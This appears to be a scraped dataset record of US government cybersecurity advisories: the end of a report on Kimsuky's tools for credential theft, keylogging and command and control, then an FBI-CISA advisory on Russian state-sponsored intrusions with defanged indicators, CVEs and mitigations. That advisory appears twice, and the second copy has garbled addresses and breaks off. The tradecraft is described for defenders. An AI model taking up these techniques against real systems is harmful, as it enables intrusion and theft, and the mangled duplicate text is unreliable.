Win7Elevate—which was noted above—is also used to evade traditional security measures. Win7Elevatve is a part of the Metasploit framework open-source code and is used to inject malicious code into explorer.exe (Process Injection,). The malicious code decrypts its spying library from resources, saves the decrypted file to disk with a random but hardcoded name in the victim's temporary folder, and loads the file as a library.,45,46,47,

Credential Access
Kimsuky uses legitimate tools and network sniffers to harvest credentials from web browsers, files, and keyloggers (Credential Access,). 

Kimsuky uses memory dump programs instead of using well-known malicious software and performs the credential extraction offline. Kimsuky uses ProcDump, a Windows command line administration tool, also available for Linux, that allows a user to create crash dumps/core dumps of processes based upon certain criteria, such as high central processing unit (CPU) utilization (OS Credential Dumping,). ProcDump monitors for CPU spikes and generates a crash dump when a value is met; it passes information to a Word document saved on the computer. It can be used as a general process dump utility that actors can embed in other scripts, as seen by Kimsuky’s inclusion of ProcDump in the BabyShark malware.,48,
According to open-source security researchers, Kimsuky abuses a Chrome extension to steal passwords and cookies from browsers (Man-in-the-Browser,).,49,50, The spearphishing email directs a victim to a phishing site, where the victim is shown a benign PDF document but is not able to view it. The victim is then redirected to the official Chrome Web Store page to install a Chrome extension, which has the ability to steal cookies and site passwords and loads a JavaScript file, named jQuery.js, from a separate site (see figure 3).,51,


Figure 3: JavaScript file, named jQuery.js,52,

Kimsuky also uses a PowerShell based keylogger, named MECHANICAL, and a network sniffing tool, named Nirsoft SniffPass (Input Capture: Keylogging, Network Sniffing,). MECHANICAL logs keystrokes to %userprofile%\appdata\roaming\apach.{txt,log} and is also a ""cryptojacker,"" which is a tool that uses a victim’s computer to mine cryptocurrency. Nirsoft SniffPass is capable of obtaining passwords sent over non-secure protocols.,53,
Kimsuky used actor-modified versions of PHProxy, an open-source web proxy written in PHP, to examine web traffic between the victim and the website accessed by the victims and to collect any credentials entered by the victim.,54,

Discovery
Kimsuky enumerates system information and the file structure for victims’ computers and networks (Discovery,). Kimsuky appears to rely on using the victim’s operating system command prompt to enumerate the file structure and system information (File and Directory Discovery,). The information is directed to C:\WINDOWS\msdatl3.inc, read by malware, and likely emailed to the malware’s command server.,55,
Collection
Kimsuky collects data from the victim system through its HWP document malware and its keylogger (Collection,). The HWP document malware changes the default program association in the Registry to open HWP documents (Event Triggered Execution: Change Default File Association,). When a user opens an HWP file, the Registry key change triggers the execution of malware that opens the HWP document and then sends a copy of the HWP document to an account under the adversary’s control. The malware then allows the user to open the file as normal without any indication to the user that anything has occurred. The keylogger intercepts keystrokes and writes them to C:\Program Files\Common Files\System\Ole DB\msolui80.inc and records the active window name where the user pressed keys (Input Capture: Keylogging,). There is another keylogger variant that logs keystrokes into C:\WINDOWS\setup.log.,56,
Kimsuky has also used a Mac OS Python implant that gathers data from Mac OS systems and sends it to a C2 server (Command and Scripting Interpreter: Python,). The Python program downloads various implants based on C2 options specified after the filedown.php (see figure 4).


Figure 4: Python Script targeting MacOS,57,
Command and Control
Kimsuky has used a modified TeamViewer client, version 5.0.9104, for Command and Control, (Remote Access Software,). During the initial infection, the service “Remote Access Service” is created and adjusted to execute C:\Windows\System32\vcmon.exe at system startup (Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder,). Every time vcmon.exe is executed, it disables the firewall by zeroing out Registry values (Impair Defenses: Disable or Modify System Firewall,). The program then modifies the TeamViewer Registry settings by changing the TeamViewer strings in TeamViewer components. The launcher then configures several Registry values, including SecurityPasswordAES, that control how the remote access tool will work. The SecurityPasswordAES Registry value represents a hash of the password used by a remote user to connect to TeamViewer Client (Use Alternate Authentication Material: Pass the Hash,). This way, the attackers set a pre-shared authentication value to have access to the TeamViewer Client. The attacker will then execute the TeamViewer client netsvcs.exe.,58,
Kimsuky has been using a consistent format. In the URL used recently—express,.,php?op=1—there appears to be an option range from 1 to 3.,59,
Exfiltration
Open-source reporting from cybersecurity companies describes two different methods Kimsuky has used to exfiltrate stolen data: via email or through an RC4 key generated as an MD5 hash or a randomly generated 117-bytes buffer (Exfiltration,).
There was no indication that the actor destroyed computers during the observed exfiltrations, suggesting Kimsuky’s intention is to steal information, not to disrupt computer networks. Kimsuky’s preferred method for sending or receiving exfiltrated information is through email, with their malware on the victim machine encrypting the data before sending it to a C2 server (Archive Collected Data,).  Kimsuky also sets up auto-forward rules within a victim’s email account (Email Collection: Email Forwarding Rule,).
Kimsuky also uses an RC4 key generated as an MD5 hash or a randomly generated 117-bytes buffer to exfiltrate stolen data. The data is sent RSA-encrypted (Encrypted Channel: Symmetric Cryptography,). Kimsuky’s malware constructs an 1120-bit public key and uses it to encrypt the 117-bytes buffer. The resulting data file is saved in C:\Program Files\Common Files\System\Ole DB\ (Data Staged: Local Data Staging,).,60,

Mitigations

Indicators of Compromise
Kimsuky has used the domains listed in table 1 to carry out its objectives:
For a downloadable copy of IOCs, see AA20-301A.stix.
Table 1: Domains used by Kimsuky

 
Table 2: Redacted domains used by Kimsuky


Contact Information

To report suspicious or criminal activity related to information found in this Joint Cybersecurity Advisory, contact your local FBI field office at www.fbi.gov/contact-us/field, or the FBI’s 24/7 Cyber Watch (CyWatch) at (855) 292-3937 or by e-mail at CyWatch@fbi.gov. When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact. To request incident response resources or technical assistance related to these threats, contact CISA at Central@cisa.dhs.gov.
 
DISCLAIMER
 

This information is provided ""as is"" for informational purposes only. The United States Government does not provide any warranties of any kind regarding this information. In no event shall the United States Government or its contractors or subcontractors be liable for any damages, including but not limited to, direct, indirect, special or consequential damages, arising out of, resulting from, or in any way connected with this information, whether or not based upon warranty, contract, tort, or otherwise, whether or not arising out of negligence, and whether or not injury was sustained from, or arose out of the results of, or reliance upon the information.
The United States Government does not endorse any commercial product or service, including any subjects of analysis. Any reference to specific commercial products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply their endorsement, recommendation, or favoring by the United States Government.


References,1, Netscout: Stolen Pencil Campaign Targets Academia,2, CYWARE Social: Babyshark malware continues to target nuclear and cryptocurrency industries,3, CYWARE Social: Babyshark malware continues to target nuclear and cryptocurrency industries,4, Netscout: Stolen Pencil Campaign Targets Academia,5, MITRE ATT&CK: Groups – Kimsuky,6, Securityweek.com: North Korean Suspected Cyber-espionage Attacks Against South Korea Entities,7, MITRE ATT&CK: Groups – Kimsuky,8, CrowdStrike: 2020 Global Threat Report,9, Malwarebytes: APTs and COVID-19: How advanced persistent threats use the coronavirus as a lure,10, PwC: Tracking ‘Kimsuky’, the North Korea-based cyber espionage group: Part 2,11, CrowdStrike: 2020 Global Threat Report,12, Netscout: Stolen Pencil Campaign Targets Academia,13, MITRE ATT&CK: Groups – Kimsuky
"">,14, Private Sector Partner,15, CYWARE Social: Babyshark malware continues to target nuclear and cryptocurrency industries,16, Malwarebytes: APTs and COVID-19: How advanced persistent threats use the coronavirus as a lure,17, cyberscoop: North Korea could accelerate commercial espionage to meet Kim’s economic deadline,18, MITRE ATT&CK: Groups – Kimsuky,19, CYWARE Social: Babyshark malware continues to target nuclear and cryptocurrency industries,20, MITRE ATT&CK: Groups – Kimsuky,21, Palo Alto Networks Unit 42: New BabyShark Malware Targets U.S. National Security Think Tanks,22, Palo Alto Networks Unit 42: New BabyShark Malware Targets U.S. National Security Think Tanks,23, CYWARE Social: Babyshark malware continues to target nuclear and cryptocurrency industries,24, MITRE ATT&CK: Groups – Kimsuky,25, Palo Alto Networks Unit 42: BabyShark Malware Part Two – Attacks Continue Using KimJongRAT and PCRat,26, McAfee: What is mshta, how can it be used and how to protect against it,27, Palo Alto Networks Unit 42: New BabyShark Malware Targets U.S. National Security Think Tanks,28, Netscout: Stolen Pencil Campaign Targets Academia,29, MITRE ATT&CK: Groups – Kimsuky,30, Palo Alto Networks Unit 42: New BabyShark Malware Targets U.S. National Security Think Tanks,31, Netscout: Stolen Pencil Campaign Targets Academia,32, Securelist: The “Kimsuky” Operation: A North Korean APT?
"">,33, Private Sector Partner
"">,34, Private Sector Partner,35, Securelist: The “Kimsuky” Operation: A North Korean APT?,36, Yoroi: The North Korean Kimsuky APT Keeps Threatening South Korea Evolving its TTPs,37, Yoroi: The North Korean Kimsuky APT Keeps Threatening South Korea Evolving its TTPs,38, Securelist: The “Kimsuky” Operation: A North Korean APT?,39, MITRE ATT&CK: Groups – Kimsuky,40, Securelist: The “Kimsuky” Operation: A North Korean APT?,41, Securelist: The “Kimsuky” Operation: A North Korean APT?,42, Securelist: The “Kimsuky” Operation: A North Korean APT?,43, MITRE ATT&CK: Groups – Kimsuky,44, McAfee: What is mshta, how can it be used and how to protect against it,45, Securityweek.com: North Korean Suspected Cyber-espionage Attacks Against South Korea Entities,46, Securelist: The “Kimsuky” Operation: A North Korean APT?,47, MITRE ATT&CK: Groups – Kimsuky,48, Detecting credential theft through memory access modelling with Microsoft Defender ATP,49, MITRE ATT&CK: Groups – Kimsuky,50, ZDNet: Cyber-espionage-group-uses-chrome-extension-to-infect-victims,51, ZDNet: Cyber-espionage-group-uses-chrome-extension-to-infect-victims,52, Netscout: Stolen Pencil Campaign Targets Academia,53, Netscout: Stolen Pencil Campaign Targets Academia 
"">,54, Private Sector Partner,55, Securelist: The “Kimsuky” Operation: A North Korean APT?,56, Securelist: The “Kimsuky” Operation: A North Korean APT? 
"">,57, Private Sector Partner,58, Securelist: The “Kimsuky” Operation: A North Korean APT? 
"">,59, Private Sector Partner,60, Securelist: The “Kimsuky” Operation: A North Korean APT? 

Revisions

October 27, 2020: Initial Version






This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-301a
72,"




Summary

This joint cybersecurity advisory uses the MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®) framework. See the ATT&CK for Enterprise framework for all referenced threat actor tactics and techniques 
This joint cybersecurity advisory—written by the Federal Bureau of Investigation (FBI) and the Cybersecurity and Infrastructure Security Agency (CISA)—provides information on Russian state-sponsored advanced persistent threat (APT) actor activity targeting various U.S. state, local, territorial, and tribal (SLTT) government networks, as well as aviation networks. This advisory updates joint CISA-FBI cybersecurity advisory AA20-283A: APT Actors Chaining Vulnerabilities Against SLTT, Critical Infrastructure, and Elections Organizations.
Since at least September 2020, a Russian state-sponsored APT actor—known variously as Berserk Bear, Energetic Bear, TeamSpy, Dragonfly, Havex, Crouching Yeti, and Koala in open-source reporting—has conducted a campaign against a wide variety of U.S. targets. The Russian state-sponsored APT actor has targeted dozens of SLTT government and aviation networks, attempted intrusions at several SLTT organizations, successfully compromised network infrastructure, and as of October 1, 2020, exfiltrated data from at least two victim servers.
The Russian-sponsored APT actor is obtaining user and administrator credentials to establish initial access, enable lateral movement once inside the network, and locate high value assets in order to exfiltrate data. In at least one compromise, the APT actor laterally traversed an SLTT victim network and accessed documents related to:

Sensitive network configurations and passwords.
Standard operating procedures (SOP), such as enrolling in multi-factor authentication (MFA).
IT instructions, such as requesting password resets.
Vendors and purchasing information.
Printing access badges.

To date, the FBI and CISA have no information to indicate this APT actor has intentionally disrupted any aviation, education, elections, or government operations. However, the actor may be seeking access to obtain future disruption options, to influence U.S. policies and actions, or to delegitimize SLTT government entities.
As this recent malicious activity has been directed at SLTT government networks, there may be some risk to elections information housed on SLTT government networks. However, the FBI and CISA have no evidence to date that integrity of elections data has been compromised. Due to the heightened awareness surrounding elections infrastructure and the targeting of SLTT government networks, the FBI and CISA will continue to monitor this activity and its proximity to elections infrastructure.

Click here for a PDF version of this report.
Click here for a STIX package of IOCs.

U.S. Heat Map of Activity
Click here for an interactive heat map of this activity (current as of November 17, 2020). Hovering the cursor over the map reveals the number and type of entities the Russian APT has targeted in each region. These totals include compromises, scanning, or other reconnaissance activity executed from the Russian APT actor infrastructure.
Note: CISA is committed to providing access to our web pages and documents for individuals with disabilities, both members of the public and federal employees. If the format of any elements or content within this document interferes with your ability to access the information, as defined in the Rehabilitation Act, please email info@us-cert.gov. To enable us to respond in a manner most helpful to you, please indicate the nature of your accessibility problem and the preferred format in which to receive the material.
Note: the heat map has interactive features that may not work in your web browser. For best use, please download and save this catalog.

Technical Details

The FBI and CISA have observed Russian state-sponsored APT actor activity targeting U.S. SLTT government networks, as well as aviation networks. The APT actor is using Turkish IP addresses 213.74.101[.]65, 213.74.139[.]196, and 212.252.30[.]170 to connect to victim web servers (Exploit Public Facing Application [T1190]).
The actor is using 213.74.101[.]65 and 213.74.139[.]196 to attempt brute force logins and, in several instances, attempted Structured Query Language (SQL) injections on victim websites (Brute Force [T1110]; Exploit Public Facing Application [T1190]). The APT actor also hosted malicious domains, including possible aviation sector target columbusairports.microsoftonline[.]host, which resolved to 108.177.235[.]92 and [cityname].westus2.cloudapp.azure.com; these domains are U.S. registered and are likely SLTT government targets (Drive-By Compromise [T1189]).
The APT actor scanned for vulnerable Citrix and Microsoft Exchange services and identified vulnerable systems, likely for future exploitation. This actor continues to exploit a Citrix Directory Traversal Bug (CVE-2019-19781) and a Microsoft Exchange remote code execution flaw (CVE-2020-0688).
The APT actor has been observed using Cisco AnyConnect Secure Socket Layer (SSL) virtual private network (VPN) connections to enable remote logins on at least one victim network, possibly enabled by an Exim Simple Mail Transfer Protocol (SMTP) vulnerability (CVE 2019-10149) (External Remote Services [T1133]). More recently, the APT actor enumerated and exploited a Fortinet VPN vulnerability (CVE-2018-13379) for Initial Access [TA0001] and a Windows Netlogon vulnerability (CVE-2020-1472) to obtain access to Windows Active Directory (AD) servers for Privilege Escalation [TA0004] within the network (Valid Accounts [T1078]). These vulnerabilities can also be leveraged to compromise other devices on the network (Lateral Movement [TA0008]) and to maintain Persistence [TA0003]).
Between early February and mid-September, these APT actors used 213.74.101[.]65, 212.252.30[.]170, 5.196.167[.]184, 37.139.7[.]16, 149.56.20[.]55, 91.227.68[.]97, and 5.45.119[.]124 to target U.S. SLTT government networks. Successful authentications—including the compromise of Microsoft Office 365 (O365) accounts—have been observed on at least one victim network (Valid Accounts [T1078]).

Mitigations

Indicators of Compromise
The APT actor used the following IP addresses and domains to carry out its objectives:

213.74.101[.]65
213.74.139[.]196
212.252.30[.]170
5.196.167[.]184
37.139.7[.]16
149.56.20[.]55
91.227.68[.]97
138.201.186[.]43
5.45.119[.]124
193.37.212[.]43
146.0.77[.]60
51.159.28[.]101
columbusairports.microsoftonline[.]host
microsoftonline[.]host
email.microsoftonline[.]services
microsoftonline[.]services
cityname[.]westus2.cloudapp.azure.com

IP address 51.159.28[.]101 appears to have been configured to receive stolen Windows New Technology Local Area Network Manager (NTLM) credentials. FBI and CISA recommend organizations take defensive actions to mitigate the risk of leaking NTLM credentials; specifically, organizations should disable NTLM or restrict outgoing NTLM. Organizations should consider blocking IP address 51.159.28[.]101 (although this action alone may not mitigate the threat, as the APT actor has likely established, or will establish, additional infrastructure points).
Organizations should check available logs for traffic to/from IP address 51.159.28[.]101 for indications of credential-harvesting activity. As the APT actors likely have—or will—establish additional infrastructure points, organizations should also monitor for Server Message Block (SMB) or WebDAV activity leaving the network to other IP addresses.
Refer to AA20-296A.stix for a downloadable copy of IOCs.
Network Defense-in-Depth
Proper network defense-in-depth and adherence to information security best practices can assist in mitigating the threat and reducing the risk to critical infrastructure. The following guidance may assist organizations in developing network defense procedures.

Keep all applications updated according to vendor recommendations, and especially prioritize updates for external facing applications and remote access services to address CVE-2019-19781, CVE-2020-0688, CVE 2019-10149, CVE-2018-13379, and CVE-2020-1472. Refer to table 1 for patch information on these CVEs.

Table 1: Patch information for CVEs



Vulnerability
Vulnerable Products
Patch Information




CVE-2019-19781


Citrix Application Delivery Controller
Citrix Gateway
Citrix SDWAN WANOP

 


Citrix blog post: firmware updates for Citrix ADC and Citrix Gateway versions 11.1 and 12.0
Citrix blog post: security updates for Citrix SD-WAN WANOP release 10.2.6 and 11.0.3
Citrix blog post: firmware updates for Citrix ADC and Citrix Gateway versions 12.1 and 13.0
Citrix blog post: firmware updates for Citrix ADC and Citrix Gateway version 10.5



CVE-2020-0688


Microsoft Exchange Server 2010 Service Pack 3 Update Rollup 30
Microsoft Exchange Server 2013 Cumulative Update 23
Microsoft Exchange Server 2016 Cumulative Update 14
Microsoft Exchange Server 2016 Cumulative Update 15
Microsoft Exchange Server 2019 Cumulative Update 3
Microsoft Exchange Server 2019 Cumulative Update 4

 

Microsoft Security Advisory for CVE-2020-0688


CVE-2019-10149


Exim versions 4.87–4.91


Exim page for CVE-2019-10149


CVE-2018-13379


FortiOS 6.0: 6.0.0 to 6.0.4
FortiOS 5.6: 5.6.3 to 5.6.7
FortiOS 5.4: 5.4.6 to 5.4.12


Fortinet Security Advisory: FG-IR-18-384


CVE-2020-1472


Windows Server 2008 R2 for x64-based Systems Service Pack 1
Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)
Windows Server 2012
Windows Server 2012 (Server Core installation)
Windows Server 2012 R2
Windows Server 2016
Windows Server 2019
Windows Server 2019 (Server Core installation)
Windows Server, version 1903  (Server Core installation)
Windows Server, version 1909  (Server Core installation)
Windows Server, version 2004   (Server Core installation)



Microsoft Security Advisory for CVE-2020-1472
 




 

Follow Microsoft’s guidance on monitoring logs for activity related to the Netlogon vulnerability, CVE-2020-1472.
If appropriate for your organization’s network, prevent external communication of all versions of SMB and related protocols at the network boundary by blocking Transmission Control Protocol (TCP) ports 139 and 445 and User Datagram Protocol (UDP) port 137. See the CISA publication on SMB Security Best Practices for more information.
Implement the prevention, detection, and mitigation strategies outlined in:

CISA Alert TA15-314A – Compromised Web Servers and Web Shells – Threat Awareness and Guidance.
National Security Agency Cybersecurity Information Sheet U/OO/134094-20 – Detect and Prevent Web Shells Malware.


Isolate external facing services in a network demilitarized zone (DMZ) since they are more exposed to malicious activity; enable robust logging, and monitor the logs for signs of compromise.
Establish a training mechanism to inform end users on proper email and web usage, highlighting current information and analysis and including common indicators of phishing. End users should have clear instructions on how to report unusual or suspicious emails.
Implement application controls to only allow execution from specified application directories. System administrators may implement this through Microsoft Software Restriction Policy, AppLocker, or similar software. Safe defaults allow applications to run from PROGRAMFILES, PROGRAMFILES(X86), and WINDOWS folders. All other locations should be disallowed unless an exception is granted.
Block Remote Desktop Protocol (RDP) connections originating from untrusted external addresses unless an exception exists; routinely review exceptions on a regular basis for validity.

Comprehensive Account Resets
For accounts where NTLM password hashes or Kerberos tickets may have been compromised (e.g., through CVE-2020-1472), a double-password-reset may be required in order to prevent continued exploitation of those accounts. For domain-admin-level credentials, a reset of KRB-TGT “Golden Tickets” may be required, and Microsoft has released specialized guidance for this. Such a reset should be performed very carefully if needed.
If there is an observation of CVE-2020-1472 Netlogon activity or other indications of valid credential abuse, it should be assumed the APT actors have compromised AD administrative accounts. In such cases, the AD forest should not be fully trusted, and, therefore, a new forest should be deployed. Existing hosts from the old compromised forest cannot be migrated in without being rebuilt and rejoined to the new domain, but migration may be done through “creative destruction,” wherein, as endpoints in the legacy forest are decommissioned, new ones can be built in the new forest. This will need to be completed in on-premise—as well as in Azure-hosted—AD instances.
Note that fully resetting an AD forest is difficult and complex; it is best done with the assistance of personnel who have successfully completed the task previously.
It is critical to perform a full password reset on all user and computer accounts in the AD forest. Use the following steps as a guide.

Create a temporary administrator account, and use this account only for all administrative actions
Reset the Kerberos Ticket Granting Ticket (krbtgt) password;[1] this must be completed before any additional actions (a second reset will take place in step 5)
Wait for the krbtgt reset to propagate to all domain controllers (time may vary)
 Reset all account passwords (passwords should be 15 characters or more and randomly assigned):

User accounts (forced reset with no legacy password reuse)
Local accounts on hosts (including local accounts not covered by Local Administrator Password Solution [LAPS])
Service accounts
Directory Services Restore Mode (DSRM) account
Domain Controller machine account
Application passwords


Reset the krbtgt password again
Wait for the krbtgt reset to propagate to all domain controllers (time may vary)
Reboot domain controllers
Reboot all endpoints

The following accounts should be reset:

AD Kerberos Authentication Master (2x)
All Active Directory Accounts
All Active Directory Admin Accounts
All Active Directory Service Accounts
All Active Directory User Accounts
DSRM Account on Domain Controllers
Non-AD Privileged Application Accounts
Non-AD Unprivileged Application Accounts
Non-Windows Privileged Accounts
Non-Windows User Accounts
Windows Computer Accounts
Windows Local Admin

VPN Vulnerabilities
Implement the following recommendations to secure your organization’s VPNs:

Update VPNs, network infrastructure devices, and devices being used to remote into work environments with the latest software patches and security configurations. See CISA Tips Understanding Patches and Software Updates and Securing Network Infrastructure Devices. Wherever possible, enable automatic updates.
Implement MFA on all VPN connections to increase security. Physical security tokens are the most secure form of MFA, followed by authenticator app-based MFA. SMS and email-based MFA should only be used when no other forms are available. If MFA is not implemented, require teleworkers to use strong passwords. See CISA Tips Choosing and Protecting Passwords and Supplementing Passwords for more information.

Discontinue unused VPN servers. Reduce your organization’s attack surface by discontinuing unused VPN servers, which may act as a point of entry for attackers. To protect your organization against VPN vulnerabilities:

Audit configuration and patch management programs.
Monitor network traffic for unexpected and unapproved protocols, especially outbound to the Internet (e.g., Secure Shell [SSH], SMB, RDP).
Implement MFA, especially for privileged accounts.
Use separate administrative accounts on separate administration workstations.
Keep software up to date. Enable automatic updates, if available.


Contact Information

To report suspicious or criminal activity related to information found in this Joint Cybersecurity Advisory, contact your local FBI field office at www.fbi.gov/contact-us/field, or the FBI’s 24/7 Cyber Watch (CyWatch) at (855) 292-3937 or by e-mail at CyWatch@fbi.gov. When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact. To request incident response resources or technical assistance related to these threats, contact CISA at Central@cisa.dhs.gov.
Resources

APT Actors Chaining Vulnerabilities Against SLTT, Critical Infrastructure, and Elections Organizations – https://us-cert.cisa.gov/ncas/alerts/aa20-283a
CISA Activity Alert CVE-2019-19781 – https://us-cert/cisa.gov/ncas/alerts/aa20-031a
CISA Vulnerability Bulletin – https://us-cert/cisa.gov/ncas/bulletins/SB19-161
CISA Current Activity – https://us-cert.cisa.gov/ncas/current-activity/2020/03/10/unpatched-microsoft-exchange-servers-vulnerable-cve-2020-0688
Citrix Directory Traversal Bug (CVE-2019-19781) – https://nvd.nist.gov/vuln/detail/CVE-2019-19781
Microsoft Exchange remote code execution flaw (CVE-2020-0688) – https://nvd.nist.gov/vuln/detail/CVE-2020-0688
CVE-2018-13379 – https://nvd.nist.gov/vuln/detail/CVE-2018-13379
CVE-2020-1472 – https://nvd.nist.gov/vuln/detail/CVE-2020-1472
CVE 2019-10149 – https://nvd.nist.gov/vuln/detail/CVE-2019-10149
NCCIC/USCERT Alert TA15-314A – Compromised Web Servers and Web Shells – Threat Awareness and Guidance – https://us-cert.cisa.gov/ncas/alerts/TA15-314A
NCCIC/US-CERT publication on SMB Security Best Practices – https://us-cert.cisa.gov/ncas/current-activity/2017/01/16/SMB-Security-Best-Practices
	 

 
DISCLAIMER
 

This information is provided ""as is"" for informational purposes only. The United States Government does not provide any warranties of any kind regarding this information. In no event shall the United States Government or its contractors or subcontractors be liable for any damages, including but not limited to, direct, indirect, special or consequential damages, arising out of, resulting from, or in any way connected with this information, whether or not based upon warranty, contract, tort, or otherwise, whether or not arising out of negligence, and whether or not injury was sustained from, or arose out of the results of, or reliance upon the information.
The United States Government does not endorse any commercial product or service, including any subjects of analysis. Any reference to specific commercial products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply their endorsement, recommendation, or favoring by the United States Government.


References

[1] Microsoft: AD Forest Recovery - Resetting the krbtgt password

Revisions

October 22, 2020: Initial Version|November 17, 2020: Added U.S. Heat Map of Activity|December 1, 2020: Added ""current as of"" date to U.S. Heat Map of Activity






This product is provided subject to this Notification and this Privacy & Use policy.


","{'TA0003', 'T1190', 'TA0008', 'T1110', 'T1189', 'TA0001', 'TA0004', 'T1133', 'T1078'}","




Summary

This joint cybersecurity advisory uses the MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®) framework. See the ATT&CK for Enterprise framework for all referenced threat actor tactics and techniques 
This joint cybersecurity advisory—written by the Federal Bureau of Investigation (FBI) and the Cybersecurity and Infrastructure Security Agency (CISA)—provides information on Russian state-sponsored advanced persistent threat (APT) actor activity targeting various U.S. state, local, territorial, and tribal (SLTT) government networks, as well as aviation networks. This advisory updates joint CISA-FBI cybersecurity advisory AA20-283A: APT Actors Chaining Vulnerabilities Against SLTT, Critical Infrastructure, and Elections Organizations.
Since at least September 2020, a Russian state-sponsored APT actor—known variously as Berserk Bear, Energetic Bear, TeamSpy, Dragonfly, Havex, Crouching Yeti, and Koala in open-source reporting—has conducted a campaign against a wide variety of U.S. targets. The Russian state-sponsored APT actor has targeted dozens of SLTT government and aviation networks, attempted intrusions at several SLTT organizations, successfully compromised network infrastructure, and as of October 1, 2020, exfiltrated data from at least two victim servers.
The Russian-sponsored APT actor is obtaining user and administrator credentials to establish initial access, enable lateral movement once inside the network, and locate high value assets in order to exfiltrate data. In at least one compromise, the APT actor laterally traversed an SLTT victim network and accessed documents related to:

Sensitive network configurations and passwords.
Standard operating procedures (SOP), such as enrolling in multi-factor authentication (MFA).
IT instructions, such as requesting password resets.
Vendors and purchasing information.
Printing access badges.

To date, the FBI and CISA have no information to indicate this APT actor has intentionally disrupted any aviation, education, elections, or government operations. However, the actor may be seeking access to obtain future disruption options, to influence U.S. policies and actions, or to delegitimize SLTT government entities.
As this recent malicious activity has been directed at SLTT government networks, there may be some risk to elections information housed on SLTT government networks. However, the FBI and CISA have no evidence to date that integrity of elections data has been compromised. Due to the heightened awareness surrounding elections infrastructure and the targeting of SLTT government networks, the FBI and CISA will continue to monitor this activity and its proximity to elections infrastructure.

Click here for a PDF version of this report.
Click here for a STIX package of IOCs.

U.S. Heat Map of Activity
Click here for an interactive heat map of this activity (current as of November 17, 2020). Hovering the cursor over the map reveals the number and type of entities the Russian APT has targeted in each region. These totals include compromises, scanning, or other reconnaissance activity executed from the Russian APT actor infrastructure.
Note: CISA is committed to providing access to our web pages and documents for individuals with disabilities, both members of the public and federal employees. If the format of any elements or content within this document interferes with your ability to access the information, as defined in the Rehabilitation Act, please email info@us-cert.gov. To enable us to respond in a manner most helpful to you, please indicate the nature of your accessibility problem and the preferred format in which to receive the material.
Note: the heat map has interactive features that may not work in your web browser. For best use, please download and save this catalog.

Technical Details

The FBI and CISA have observed Russian state-sponsored APT actor activity targeting U.S. SLTT government networks, as well as aviation networks. The APT actor is using Turkish IP addresses 213.74.101,.,65, 213.74.139,.,196, and 212.252.30,.,170 to connect to victim web servers (Exploit Public Facing Application,).
The actor is using 213.74.101,.,65 and 213.74.139,.,196 to attempt brute force logins and, in several instances, attempted Structured Query Language (SQL) injections on victim websites (Brute Force,; Exploit Public Facing Application,). The APT actor also hosted malicious domains, including possible aviation sector target columbusairports.microsoftonline,.,host, which resolved to 108.177.235,.,92 and,cityname,.westus2.cloudapp.azure.com; these domains are U.S. registered and are likely SLTT government targets (Drive-By Compromise,).
The APT actor scanned for vulnerable Citrix and Microsoft Exchange services and identified vulnerable systems, likely for future exploitation. This actor continues to exploit a Citrix Directory Traversal Bug (CVE-2019-19781) and a Microsoft Exchange remote code execution flaw (CVE-2020-0688).
The APT actor has been observed using Cisco AnyConnect Secure Socket Layer (SSL) virtual private network (VPN) connections to enable remote logins on at least one victim network, possibly enabled by an Exim Simple Mail Transfer Protocol (SMTP) vulnerability (CVE 2019-10149) (External Remote Services,). More recently, the APT actor enumerated and exploited a Fortinet VPN vulnerability (CVE-2018-13379) for Initial Access, and a Windows Netlogon vulnerability (CVE-2020-1472) to obtain access to Windows Active Directory (AD) servers for Privilege Escalation, within the network (Valid Accounts,). These vulnerabilities can also be leveraged to compromise other devices on the network (Lateral Movement,) and to maintain Persistence,).
Between early February and mid-September, these APT actors used 213.74.101,.,65, 212.252.30,.,170, 5.196.167,.,184, 37.139.7,.,16, 149.56.20,.,55, 91.227.68,.,97, and 5.45.119,.,124 to target U.S. SLTT government networks. Successful authentications—including the compromise of Microsoft Office 365 (O365) accounts—have been observed on at least one victim network (Valid Accounts,).

Mitigations

Indicators of Compromise
The APT actor used the following IP addresses and domains to carry out its objectives:

213.74.101,.,65
213.74.139,.,196
212.252.30,.,170
5.196.167,.,184
37.139.7,.,16
149.56.20,.,55
91.227.68,.,97
138.201.186,.,43
5.45.119,.,124
193.37.212,.,43
146.0.77,.,60
51.159.28,.,101
columbusairports.microsoftonline,.,host
microsoftonline,.,host
email.microsoftonline,.,services
microsoftonline,.,services
cityname,.,westus2.cloudapp.azure.com

IP address 51.159.28,.,101 appears to have been configured to receive stolen Windows New Technology Local Area Network Manager (NTLM) credentials. FBI and CISA recommend organizations take defensive actions to mitigate the risk of leaking NTLM credentials; specifically, organizations should disable NTLM or restrict outgoing NTLM. Organizations should consider blocking IP address 51.159.28,.,101 (although this action alone may not mitigate the threat, as the APT actor has likely established, or will establish, additional infrastructure points).
Organizations should check available logs for traffic to/from IP address 51.159.28,.,101 for indications of credential-harvesting activity. As the APT actors likely have—or will—establish additional infrastructure points, organizations should also monitor for Server Message Block (SMB) or WebDAV activity leaving the network to other IP addresses.
Refer to AA20-296A.stix for a downloadable copy of IOCs.
Network Defense-in-Depth
Proper network defense-in-depth and adherence to information security best practices can assist in mitigating the threat and reducing the risk to critical infrastructure. The following guidance may assist organizations in developing network defense procedures.

Keep all applications updated according to vendor recommendations, and especially prioritize updates for external facing applications and remote access services to address CVE-2019-19781, CVE-2020-0688, CVE 2019-10149, CVE-2018-13379, and CVE-2020-1472. Refer to table 1 for patch information on these CVEs.

Table 1: Patch information for CVEs

 

Follow Microsoft’s guidance on monitoring logs for activity related to the Netlogon vulnerability, CVE-2020-1472.
If appropriate for your organization’s network, prevent external communication of all versions of SMB and related protocols at the network boundary by blocking Transmission Control Protocol (TCP) ports 139 and 445 and User Datagram Protocol (UDP) port 137. See the CISA publication on SMB Security Best Practices for more information.
Implement the prevention, detection, and mitigation strategies outlined in:

